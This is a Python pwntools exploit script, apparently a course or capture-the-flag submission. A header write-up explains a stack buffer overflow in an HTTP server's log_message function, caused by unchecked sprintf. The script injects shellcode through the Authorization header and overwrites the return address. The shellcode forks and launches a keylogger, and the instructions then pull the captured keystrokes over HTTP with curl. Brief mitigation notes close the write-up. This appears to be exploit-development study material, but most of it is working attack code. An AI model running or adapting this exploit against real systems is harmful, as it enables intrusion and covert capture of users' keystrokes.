'''
[Exploit Overview]
This exploit launches ./keylog with code injection.
The payload is injected through a buffer and exploits the bufferoverflow vulnerability to overwrite the return address.

[Challenges & Decisions]
The hardest part of this challenge lies in enabling the attacker to access the logged keyboard events after launching the keylogger.
If we don't fork the process, we can't access logged_keyboard_events.txt from the attacker's machine.

1. We fork the proces with a sys_fork syscall
2. If the process is the main process, we exit on the thread, so the program doesn't hang. (parent label in shellcode)
   If the process is the child, we launch ./keylog using sys_execve. (child label in shellcode)

[Execution Instructions]
1. cp the standard keylogger 'keylog' in the server_data folder
2. run the exploit
3. curl the logged keyboard events from the attacker's machine with curl http://{IP}:{PORT}/logged_keyboard_events.txt

[Vulnerability Discovery]
- log_message: sprintf in C is considered unsafe as it lacks bounds checking, potentially leading to buffer overflows.

[Preventive Measures]
- Safer alternatives like snprintf should be used.
- Data Execution Prevention (mostly) prevents code injection unless disabled by the attacker.
- Although stack canaries and secure library function make code injection harder, they do not always prevent it outright.
'''

from pwn import *
import sys

if len(sys.argv) != 3:
    print("Usage: python script.py <target ip> <target port>")
    sys.exit(1)
    
context.encoding = "latin1"
TARGET = sys.argv[1]
TARGET_PORT = sys.argv[2]

shellcode = b""

log_buffer_rbp_offset = 0x450
log_buffer_prefix = 49
original_rbp = 0x7ffff7ad1920 #0x7ffff7acf920

io = remote(TARGET, TARGET_PORT)

# read shellcode
# check README for how it works.
with open("./shell-raw", "rb") as file:
    for line in file.readlines():
        shellcode += line

format = "Request from " + "a" * 15 + " at fd a\n"

get_request = f"GET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic%s\r\n\r\n"
print("request length: " + str(len(get_request)))
get_request = get_request.encode('latin-1')

offset = len(f"== Request from {TARGET}" + " " * (15 - len(TARGET)) + f" at fd 4         \nGET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic")

# calculate address log_message+280 (return)
#shellcode_location = 0x7ffff7acf4d0 + offset
shellcode_location = original_rbp - log_buffer_rbp_offset + offset

# This needs to be at log_message+280: 0x7ffff7acf593
log.info(f"shellcode should be stored at: {hex(shellcode_location)} based on calculations...")

# Calculate padding size
padding_size = ((log_buffer_rbp_offset - len(format)) - (len(get_request) - 2)) - len(shellcode)

# Prepare exploit
sc1_exploit = get_request.replace(b"%s", shellcode + b"q" * padding_size + p64(shellcode_location)[:-2])    # p64 zet om naar 8 bytes maar we hebben er 6 dus remove 2 laatste

### PERFORM ATTACK ###
io.send(sc1_exploit)
io.close()
